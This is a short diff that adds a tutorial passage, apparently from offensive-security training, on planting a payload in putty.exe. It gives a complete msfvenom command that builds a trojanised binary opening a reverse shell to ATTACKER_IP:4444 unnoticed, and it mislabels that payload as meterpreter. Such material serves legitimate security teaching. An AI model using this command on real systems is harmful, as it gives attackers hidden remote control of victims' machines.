@@ -1,0 +1,9 @@
+You can easily plant a payload of your preference in any .exe file with msfvenom. 
+The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. 
+
+To create a backdoored putty.exe, we can use the following command:
+
+    -msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+
+The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. 
+While this method is good enough to establish persistence, let's look at other sneakier techniques.
